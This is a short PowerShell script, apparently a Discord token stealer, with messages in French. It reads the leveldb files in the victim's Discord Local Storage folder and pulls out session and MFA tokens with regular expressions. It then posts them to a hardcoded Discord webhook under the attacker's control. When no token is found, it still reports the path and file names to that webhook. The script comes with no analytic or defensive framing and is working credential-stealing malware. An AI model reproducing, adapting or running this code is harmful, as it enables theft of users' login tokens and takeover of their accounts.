$path = "$env:APPDATA\discord\Local Storage\leveldb"
$webhook = "https://discord.com/api/webhooks/1504566316172837029/fhDisuj783W4JP2bskkTI5dhT60Df8aQtkp9oqsLp7-xADYmaF-mvkCKvYaoNzzjbkTs"
$result = ""

Get-ChildItem -Path $path -Filter "*.ldb" | ForEach-Object {
    $content = [System.Text.Encoding]::UTF8.GetString([System.IO.File]::ReadAllBytes($_.FullName))
    
    # Token standard
    $pattern = '"token":"([^"]+)"'
    $match = [regex]::Match($content, $pattern)
    if ($match.Success) {
        $result += "Token: " + $match.Groups[1].Value + "`n"
    }
    
    # Token MFA
    $pattern2 = 'mfa\.[a-zA-Z0-9_-]{80,}'
    $match2 = [regex]::Match($content, $pattern2)
    if ($match2.Success) {
        $result += "Token MFA: " + $match2.Value + "`n"
    }
}

if ($result -ne "") {
    $body = @{content = "**Tokens trouvés :**```" + $result + "```"}
    Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json"
} else {
    $body = @{content = "**Aucun token trouvé - diagnostic:**`nChemin: $path`nFichiers trouvés: " + (Get-ChildItem -Path $path -Filter "*.ldb" | ForEach-Object { $_.Name }) -join ", "}
    Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json"
}